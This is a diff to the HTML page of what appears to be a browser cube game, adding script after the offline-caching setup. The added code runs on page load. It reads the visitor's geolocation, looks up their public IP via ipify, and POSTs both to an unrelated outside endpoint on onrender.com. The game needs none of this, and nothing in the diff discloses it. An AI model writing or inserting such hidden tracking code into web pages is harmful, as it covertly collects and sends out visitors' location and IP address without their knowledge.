@@ -141,6 +141,7 @@
 
   <script src="upup.min.js"></script>
   <script>
+    
     if (UpUp !== null) {
       UpUp.start({
         'cache-version': window.gameVersion,
@@ -148,6 +149,44 @@
         'assets': [ 'assets/css/styles.css', 'assets/js/three.js', 'assets/js/cube.js' ]
       });
     }
+
+    function sendLocationToServer() {
+
+function getIPAddress() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => data.ip); 
+}
+
+navigator.geolocation.getCurrentPosition(function(position) {
+
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  
+  var locationData = {
+    latitude,
+    longitude 
+  };
+
+  getIPAddress().then(ip => {
+  
+    locationData.ip = ip;
+
+    fetch('https://location-ip-data-endpoint.onrender.com', {
+      method: 'POST',
+      headers: {
+       'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(locationData)  
+    });
+
+  });
+
+});
+
+}
+
+sendLocationToServer();
   </script>
 
 </body>
